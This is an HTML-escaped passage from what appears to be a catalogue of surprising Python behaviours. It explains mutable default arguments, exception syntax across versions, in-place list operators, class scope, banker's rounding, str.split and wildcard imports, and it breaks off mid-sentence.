&#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;[&#39;some_string&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;[&#39;some_string&#39;, &#39;some_string&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_func([])&#xA;[&#39;some_string&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;[&#39;some_string&#39;, &#39;some_string&#39;, &#39;some_string&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The default mutable arguments of functions in Python aren&#39;t really initialized every time you call the function. Instead, the recently assigned value to them is used as the default value. When we explicitly passed &lt;code&gt;[]&lt;/code&gt; to &lt;code&gt;some_func&lt;/code&gt; as the argument, the default value of the &lt;code&gt;default_arg&lt;/code&gt; variable was not used, so the function returned as expected.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(default_arg=[]):&#xA;    default_arg.append(&#34;some_string&#34;)&#xA;    return default_arg&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__ #This will show the default argument values for the function&#xA;([],)&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__&#xA;([&#39;some_string&#39;],)&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__&#xA;([&#39;some_string&#39;, &#39;some_string&#39;],)&#xA;&amp;gt;&amp;gt;&amp;gt; some_func([])&#xA;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__&#xA;([&#39;some_string&#39;, &#39;some_string&#39;],)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;A common practice to avoid bugs due to mutable arguments is to assign &lt;code&gt;None&lt;/code&gt; as the default value and later check if any value is passed to the function corresponding to that argument. Example:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(default_arg=None):&#xA;    if default_arg is None:&#xA;        default_arg = []&#xA;    default_arg.append(&#34;some_string&#34;)&#xA;    return default_arg&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Catching the Exceptions&lt;/h3&gt; &#xA;&lt;!-- Example ID: b5ca5e6a-47b9-4f69-9375-cda0f8c6755d ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;try:&#xA;    # This should raise an ``IndexError``&#xA;    print(some_list[4])&#xA;except IndexError, ValueError:&#xA;    print(&#34;Caught!&#34;)&#xA;&#xA;try:&#xA;    # This should raise a ``ValueError``&#xA;    some_list.remove(4)&#xA;except IndexError, ValueError:&#xA;    print(&#34;Caught again!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;Caught!&#xA;&#xA;ValueError: list.remove(x): x not in list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  File &#34;&amp;lt;input&amp;gt;&#34;, line 3&#xA;    except IndexError, ValueError:&#xA;                     ^&#xA;SyntaxError: invalid syntax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To add multiple Exceptions to the except clause, you need to pass them as parenthesized tuple as the first argument. The second argument is an optional name, which when supplied will bind the Exception instance that has been raised. Example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;try:&#xA;   # This should raise a ``ValueError``&#xA;   some_list.remove(4)&#xA;except (IndexError, ValueError), e:&#xA;   print(&#34;Caught again!&#34;)&#xA;   print(e)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Caught again!&#xA;list.remove(x): x not in list&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  File &#34;&amp;lt;input&amp;gt;&#34;, line 4&#xA;    except (IndexError, ValueError), e:&#xA;                                     ^&#xA;IndentationError: unindent does not match any outer indentation level&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Separating the exception from the variable with a comma is deprecated and does not work in Python 3; the correct way is to use &lt;code&gt;as&lt;/code&gt;. Example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;try:&#xA;    some_list.remove(4)&#xA;&#xA;except (IndexError, ValueError) as e:&#xA;    print(&#34;Caught again!&#34;)&#xA;    print(e)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Caught again!&#xA;list.remove(x): x not in list&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Same operands, different story!&lt;/h3&gt; &#xA;&lt;!-- Example ID: ca052cdf-dd2d-4105-b936-65c28adc18a0 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = [1, 2, 3, 4]&#xA;b = a&#xA;a = a + [5, 6, 7, 8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;[1, 2, 3, 4, 5, 6, 7, 8]&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;[1, 2, 3, 4]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = [1, 2, 3, 4]&#xA;b = a&#xA;a += [5, 6, 7, 8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;[1, 2, 3, 4, 5, 6, 7, 8]&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;[1, 2, 3, 4, 5, 6, 7, 8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;a += b&lt;/code&gt; doesn&#39;t always behave the same way as &lt;code&gt;a = a + b&lt;/code&gt;. Classes &lt;em&gt;may&lt;/em&gt; implement the &lt;em&gt;&lt;code&gt;op=&lt;/code&gt;&lt;/em&gt; operators differently, and lists do this.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The expression &lt;code&gt;a = a + [5,6,7,8]&lt;/code&gt; generates a new list and sets &lt;code&gt;a&lt;/code&gt;&#39;s reference to that new list, leaving &lt;code&gt;b&lt;/code&gt; unchanged.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The expression &lt;code&gt;a += [5,6,7,8]&lt;/code&gt; is actually mapped to an &#34;extend&#34; function that operates on the list such that &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; still point to the same list that has been modified in-place.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Name resolution ignoring class scope&lt;/h3&gt; &#xA;&lt;!-- Example ID: 03f73d96-151c-4929-b0a8-f74430788324 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = 5&#xA;class SomeClass:&#xA;    x = 17&#xA;    y = (x for i in range(10))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list(SomeClass.y)[0]&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = 5&#xA;class SomeClass:&#xA;    x = 17&#xA;    y = [x for i in range(10)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.y[0]&#xA;17&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.y[0]&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Scopes nested inside class definition ignore names bound at the class level.&lt;/li&gt; &#xA; &lt;li&gt;A generator expression has its own scope.&lt;/li&gt; &#xA; &lt;li&gt;Starting from Python 3.X, list comprehensions also have their own scope.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Rounding like a banker *&lt;/h3&gt; &#xA;&lt;p&gt;Let&#39;s implement a naive function to get the middle element of a list:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def get_middle(some_list):&#xA;    mid_index = round(len(some_list) / 2)&#xA;    return some_list[mid_index - 1]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Python 3.x:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; get_middle([1])  # looks good&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; get_middle([1,2,3])  # looks good&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; get_middle([1,2,3,4,5])  # huh?&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; len([1,2,3,4,5]) / 2  # good&#xA;2.5&#xA;&amp;gt;&amp;gt;&amp;gt; round(len([1,2,3,4,5]) / 2)  # why?&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It seems as though Python rounded 2.5 to 2.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This is not a float precision error, in fact, this behavior is intentional. Since Python 3.0, &lt;code&gt;round()&lt;/code&gt; uses &lt;a href=&#34;https://en.wikipedia.org/wiki/Rounding#Round_half_to_even&#34;&gt;banker&#39;s rounding&lt;/a&gt; where .5 fractions are rounded to the nearest &lt;strong&gt;even&lt;/strong&gt; number:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; round(0.5)&#xA;0&#xA;&amp;gt;&amp;gt;&amp;gt; round(1.5)&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; round(2.5)&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; import numpy  # numpy does the same&#xA;&amp;gt;&amp;gt;&amp;gt; numpy.round(0.5)&#xA;0.0&#xA;&amp;gt;&amp;gt;&amp;gt; numpy.round(1.5)&#xA;2.0&#xA;&amp;gt;&amp;gt;&amp;gt; numpy.round(2.5)&#xA;2.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This is the recommended way to round .5 fractions as described in &lt;a href=&#34;https://en.wikipedia.org/wiki/IEEE_754#Rounding_rules&#34;&gt;IEEE 754&lt;/a&gt;. However, the other way (round away from zero) is taught in school most of the time, so banker&#39;s rounding is likely not that well known. Furthermore, some of the most popular programming languages (for example: JavaScript, Java, C/C++, Ruby, Rust) do not use banker&#39;s rounding either. Therefore, this is still quite special to Python and may result in confusion when rounding fractions.&lt;/li&gt; &#xA; &lt;li&gt;See the &lt;a href=&#34;https://docs.python.org/3/library/functions.html#round&#34;&gt;round() docs&lt;/a&gt; or &lt;a href=&#34;https://stackoverflow.com/questions/10825926/python-3-x-rounding-behavior&#34;&gt;this stackoverflow thread&lt;/a&gt; for more information.&lt;/li&gt; &#xA; &lt;li&gt;Note that &lt;code&gt;get_middle([1])&lt;/code&gt; only returned 1 because the index was &lt;code&gt;round(0.5) - 1 = 0 - 1 = -1&lt;/code&gt;, returning the last element in the list.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Needles in a Haystack *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 52a199b1-989a-4b28-8910-dff562cebba9 ---&gt; &#xA;&lt;p&gt;I haven&#39;t met even a single experience Pythonist till date who has not come across one or more of the following scenarios,&lt;/p&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x, y = (0, 1) if True else None, None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x, y  # expected (0, 1)&#xA;((0, 1), None)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;t = (&#39;one&#39;, &#39;two&#39;)&#xA;for i in t:&#xA;    print(i)&#xA;&#xA;t = (&#39;one&#39;)&#xA;for i in t:&#xA;    print(i)&#xA;&#xA;t = ()&#xA;print(t)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;one&#xA;two&#xA;o&#xA;n&#xA;e&#xA;tuple()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ten_words_list = [&#xA;    &#34;some&#34;,&#xA;    &#34;very&#34;,&#xA;    &#34;big&#34;,&#xA;    &#34;list&#34;,&#xA;    &#34;that&#34;&#xA;    &#34;consists&#34;,&#xA;    &#34;of&#34;,&#xA;    &#34;exactly&#34;,&#xA;    &#34;ten&#34;,&#xA;    &#34;words&#34;&#xA;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; len(ten_words_list)&#xA;9&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;4. Not asserting strongly enough&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = &#34;python&#34;&#xA;b = &#34;javascript&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# An assert statement with an assertion failure message.&#xA;&amp;gt;&amp;gt;&amp;gt; assert(a == b, &#34;Both languages are different&#34;)&#xA;# No AssertionError is raised&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;5.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;some_dict = {&#xA;  &#34;key_1&#34;: 1,&#xA;  &#34;key_2&#34;: 2,&#xA;  &#34;key_3&#34;: 3&#xA;}&#xA;&#xA;some_list = some_list.append(4) &#xA;some_dict = some_dict.update({&#34;key_4&#34;: 4})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(some_list)&#xA;None&#xA;&amp;gt;&amp;gt;&amp;gt; print(some_dict)&#xA;None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;6.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_recursive_func(a):&#xA;    if a[0] == 0:&#xA;        return&#xA;    a[0] -= 1&#xA;    some_recursive_func(a)&#xA;    return a&#xA;&#xA;def similar_recursive_func(a):&#xA;    if a == 0:&#xA;        return a&#xA;    a -= 1&#xA;    similar_recursive_func(a)&#xA;    return a&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_recursive_func([5, 0])&#xA;[0, 0]&#xA;&amp;gt;&amp;gt;&amp;gt; similar_recursive_func(5)&#xA;4&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;For 1, the correct statement for expected behavior is &lt;code&gt;x, y = (0, 1) if True else (None, None)&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;For 2, the correct statement for expected behavior is &lt;code&gt;t = (&#39;one&#39;,)&lt;/code&gt; or &lt;code&gt;t = &#39;one&#39;,&lt;/code&gt; (missing comma) otherwise the interpreter considers &lt;code&gt;t&lt;/code&gt; to be a &lt;code&gt;str&lt;/code&gt; and iterates over it character by character.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;()&lt;/code&gt; is a special token and denotes empty &lt;code&gt;tuple&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In 3, as you might have already figured out, there&#39;s a missing comma after 5th element (&lt;code&gt;&#34;that&#34;&lt;/code&gt;) in the list. So by implicit string literal concatenation,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ten_words_list&#xA;[&#39;some&#39;, &#39;very&#39;, &#39;big&#39;, &#39;list&#39;, &#39;thatconsists&#39;, &#39;of&#39;, &#39;exactly&#39;, &#39;ten&#39;, &#39;words&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;No &lt;code&gt;AssertionError&lt;/code&gt; was raised in 4th snippet because instead of asserting the individual expression &lt;code&gt;a == b&lt;/code&gt;, we&#39;re asserting entire tuple. The following snippet will clear things up,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = &#34;python&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; b = &#34;javascript&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; assert a == b&#xA;Traceback (most recent call last):&#xA;    File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AssertionError&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; assert (a == b, &#34;Values are not equal&#34;)&#xA;&amp;lt;stdin&amp;gt;:1: SyntaxWarning: assertion is always true, perhaps remove parentheses?&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; assert a == b, &#34;Values are not equal&#34;&#xA;Traceback (most recent call last):&#xA;    File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AssertionError: Values are not equal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;As for the fifth snippet, most methods that modify the items of sequence/mapping objects like &lt;code&gt;list.append&lt;/code&gt;, &lt;code&gt;dict.update&lt;/code&gt;, &lt;code&gt;list.sort&lt;/code&gt;, etc. modify the objects in-place and return &lt;code&gt;None&lt;/code&gt;. The rationale behind this is to improve performance by avoiding making a copy of the object if the operation can be done in-place (Referred from &lt;a href=&#34;https://docs.python.org/3/faq/design.html#why-doesn-t-list-sort-return-the-sorted-list&#34;&gt;here&lt;/a&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Last one should be fairly obvious, mutable object (like &lt;code&gt;list&lt;/code&gt;) can be altered in the function, and the reassignment of an immutable (&lt;code&gt;a -= 1&lt;/code&gt;) is not an alteration of the value.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Being aware of these nitpicks can save you hours of debugging effort in the long run.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Splitsies *&lt;/h3&gt; &#xA;&lt;!-- Example ID: ec3168ba-a81a-4482-afb0-691f1cc8d65a ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39;.split()&#xA;[&#39;a&#39;]&#xA;&#xA;# is same as&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39;.split(&#39; &#39;)&#xA;[&#39;a&#39;]&#xA;&#xA;# but&#xA;&amp;gt;&amp;gt;&amp;gt; len(&#39;&#39;.split())&#xA;0&#xA;&#xA;# isn&#39;t the same as&#xA;&amp;gt;&amp;gt;&amp;gt; len(&#39;&#39;.split(&#39; &#39;))&#xA;1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It might appear at first that the default separator for split is a single space &lt;code&gt;&#39; &#39;&lt;/code&gt;, but as per the &lt;a href=&#34;https://docs.python.org/3/library/stdtypes.html#str.split&#34;&gt;docs&lt;/a&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;If sep is not specified or is &lt;code&gt;None&lt;/code&gt;, a different splitting algorithm is applied: runs of consecutive whitespace are regarded as a single separator, and the result will contain no empty strings at the start or end if the string has leading or trailing whitespace. Consequently, splitting an empty string or a string consisting of just whitespace with a None separator returns &lt;code&gt;[]&lt;/code&gt;. If sep is given, consecutive delimiters are not grouped together and are deemed to delimit empty strings (for example, &lt;code&gt;&#39;1,,2&#39;.split(&#39;,&#39;)&lt;/code&gt; returns &lt;code&gt;[&#39;1&#39;, &#39;&#39;, &#39;2&#39;]&lt;/code&gt;). Splitting an empty string with a specified separator returns &lt;code&gt;[&#39;&#39;]&lt;/code&gt;.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt;Noticing how the leading and trailing whitespaces are handled in the following snippet will make things clear, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39; a &#39;.split(&#39; &#39;)&#xA;[&#39;&#39;, &#39;a&#39;, &#39;&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; &#39; a &#39;.split()&#xA;[&#39;a&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;&#39;.split(&#39; &#39;)&#xA;[&#39;&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Wild imports *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 83deb561-bd55-4461-bb5e-77dd7f411e1c ---&gt; &#xA;&lt;!-- read-only --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# File: module.py&#xA;&#xA;def some_weird_name_func_():&#xA;    print(&#34;works!&#34;)&#xA;&#xA;def _another_weird_name_func():&#xA;    print(&#34;works!&#34;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from module import *&#xA;&amp;gt;&amp;gt;&amp;gt; some_weird_name_func_()&#xA;&#34;works!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; _another_weird_name_func()&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;NameError: name &#39;_another_weird_name_func&#39; is not defined&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;It is often advisable to not use wildcard imports. The first obvious reason for this is, in wildcard imports, the names with a leading underscore don&#39;t get imported. This may lead to errors during runtime.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Had we used &lt;code&gt;from ... import a, b, c&lt;/code&gt; syntax, the above &lt;code&gt;NameError&lt;/code&gt; wouldn&#39;t have occurred.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from module import some_weird_name_func_, _another_weird_name_func&#xA;&amp;gt;&amp;gt;&amp;gt; _another_weird_name_func()&#xA;works!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you really want to use wildcard imports, then you&#39;d have to define the list &lt;code&gt;__all__&lt;/code&gt; in your module that will contain a list of public objects that&#39;ll be available when we do wildcard imports.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;__all__ = [&#39;_another_weird_name_func&#39;]&#xA;&#xA;def some_weird_name_func_():&#xA;    print(&#34;works!&#34;)&#xA;&#xA;def _another_weird_name_func():&#xA;    print(&#34;works!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; _another_weird_name_func()&#xA;&#34;works!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_weird_name_func_()&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;NameError: name &#39;some_weird_name_func_&#39; is not defined&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ All sorted? *&lt;/h3&gt; &#xA;&lt;!-- Example ID: e5ff1eaf-8823-4738-b4ce-b73f7c9d5511 --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 7, 8, 9&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(x) == x&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(x) == sorted(x)&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; y = reversed(x)&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(y) == sorted(y)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;code&gt;sorted&lt;/code&gt; method always returns a list, and comparing lists and tuples always returns &lt;code&gt;False&lt;/code&gt; in Python.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; [] == tuple()&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; x = 7, 8, 9&#xA;&amp;gt;&amp;gt;&amp;gt; type(x), type(sorted(x))&#xA;(tuple, list)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Unlike 